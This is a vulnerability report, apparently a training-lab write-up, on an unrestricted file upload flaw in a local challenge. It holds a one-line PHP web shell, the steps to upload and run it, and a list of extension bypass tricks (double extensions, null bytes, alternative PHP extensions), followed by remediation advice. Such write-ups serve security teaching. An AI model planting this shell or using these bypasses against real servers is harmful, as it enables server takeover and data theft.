# Unrestricted

## Vulnerability Report : Unrestricted File Upload

**Challenge Name:** Unrestricted

### 1. Vulnerability Name & Description

**Unrestricted File Upload with Remote Code Execution**

The application contains an unrestricted file upload vulnerability that allows attackers to upload malicious files, including executable scripts (PHP, JSP, ASPX), despite claiming to restrict uploads to image formats only. The vulnerability occurs when the application performs insufficient validation on uploaded files, relying solely on client-side checks or weak server-side validation that can be easily bypassed. Attackers can upload web shells or malicious scripts that are then accessible via direct URL access, leading to Remote Code Execution. The uploaded files are stored in a web-accessible directory without proper restrictions, allowing attackers to execute arbitrary code on the server with web application privileges.

### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:** [http://localhost:1337/lab/file-upload/unrestricted/](http://localhost:1337/lab/file-upload/unrestricted/)

**Vulnerable Parameter:** File upload form field

**Stated Restrictions:** "Allowed formats: gif, jpg, jpeg, png"

**Malicious File Created:**

php

`<?php system($_GET['cmd']); ?>`

Filename: `cmd.php`

**Attack Steps:**

1. Access the Unrestricted file upload page at [http://localhost:1337/lab/file-upload/unrestricted/](http://localhost:1337/lab/file-upload/unrestricted/)
2. Observe upload form states allowed formats: gif, jpg, jpeg, png
3. Create malicious PHP web shell file named `cmd.php` containing: `<?php system($_GET['cmd']); ?>`
4. Open browser Developer Tools and navigate to Network tab
5. Select the malicious `cmd.php` file for upload
6. Intercept the upload request in Developer Tools
7. Observe POST request with multipart/form-data containing the PHP file
8. Request shows Content-Type: application/x-php and filename="cmd.php"
9. Submit the upload request without modification
10. Application accepts the PHP file despite stated restrictions
11. Success message displays: "File uploaded successfully!"
12. File path shown: "uploads/cmd.php"
13. Navigate to uploaded file: [http://localhost:1337/lab/file-upload/unrestricted/uploads/cmd.php?cmd=id](http://localhost:1337/lab/file-upload/unrestricted/uploads/cmd.php?cmd=id)
14. Execute command by accessing: /uploads/cmd.php?cmd=id
15. Output displays: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
16. Successfully achieved Remote Code Execution through file upload

**File Extension Bypass Techniques:**

\`# Double extensions shell.php.jpg shell.jpg.php

## Null byte injection (older servers)

shell.php%00.jpg shell.php\x00.jpg

## Alternative PHP extensions

shell.php3 shell.php4 shell.php5 shell.phtml shell.phar

## Case manipulation

shell.PhP shell.pHp

## Adding special characters

shell.php..... shell.php;.jpg\`

### 3. Impact Analysis

* **Remote Code Execution (RCE):** Complete server compromise through execution of arbitrary system commands
* **Web Shell Installation:** Persistent backdoor access for ongoing malicious activities
* **Data Exfiltration:** Access to all application data, databases, configuration files, and user information
* **Malware Distribution:** Uploaded malware can infect server and be distributed to application users
* **Server Takeover:** Full control over web server with ability to modify files and install additional backdoors
* **Privilege Escalation:** Potential to escalate from www-data to root privileges
* **Lateral Movement:** Compromised server becomes entry point for attacking internal network
* **Defacement:** Ability to modify website content and damage brand reputation
* **Confidentiality: CRITICAL** - Complete access to all server files, databases, and sensitive information
* **Integrity: CRITICAL** - Ability to modify any file, inject malware, alter application behavior
* **Availability: CRITICAL** - Can delete files, crash services, or launch resource exhaustion attacks
* **Business Impact:** Complete application compromise, data breach, service disruption, regulatory violations, reputational damage

### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** 9.8 (Critical)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

### 5. Risk Rating / Severity

**SEVERITY: CRITICAL**

**Risk Level:** IMMEDIATE ACTION REQUIRED - EMERGENCY

Unrestricted file upload with RCE is one of the most critical web application vulnerabilities. It provides attackers with direct code execution capabilities and complete server control, requiring immediate emergency response.

### 6. Remediation / Mitigation Steps

1. **Implement Strict File Type Validation:**
   * Validate file content (magic bytes/file signature), not just extension
   * Use server-side MIME type validation with libraries like fileinfo
   * Reject files that don't match expected image signatures
   * Never trust client-side validation or Content-Type headers
2. **Rename Uploaded Files:**
   * Generate random filenames using secure methods (UUID, hash)
   * Remove original file extension completely
   * Store mapping between original and new filenames in database
   * Prevent execution by removing executable extensions
3. **Store Files Outside Web Root:**
   * Store uploaded files in directory outside web-accessible paths
   * Serve files through application script with access controls
   * Implement proper authentication and authorization checks
   * Use X-Sendfile or similar mechanisms for file delivery
4. **Disable Script Execution in Upload Directory:**
   * Configure web server to prevent script execution in upload folders
   * Add .htaccess rules or nginx configuration to deny PHP execution
   * Set appropriate directory permissions (no execute permissions)
5. **Implement File Size and Quantity Limits:**
   * Enforce maximum file size limits
   * Limit number of uploads per user/session
   * Implement rate limiting to prevent abuse
6. **Use Antivirus Scanning:**
   * Scan all uploaded files with antivirus software
   * Quarantine suspicious files for manual review
   * Reject files detected as malicious

### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

* Screenshot 1: Upload page displays "Allowed formats: gif, jpg, jpeg, png" indicating intended image-only restriction for file uploads.

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

* Screenshot 2: Browser Developer Tools Network tab shows POST request with malicious PHP file cmd.php being uploaded with Content-Type: application/x-php, demonstrating bypass of stated restrictions.

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

* Screenshot 3: Success message "File uploaded successfully!" with file path "uploads/cmd.php" confirms malicious PHP web shell was accepted despite image-only policy.

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

* Screenshot 4: Accessing uploaded shell at /uploads/cmd.php?cmd=id displays output "uid=33(www-data) gid=33(www-data) groups=33(www-data)" confirming successful Remote Code Execution with web server privileges.

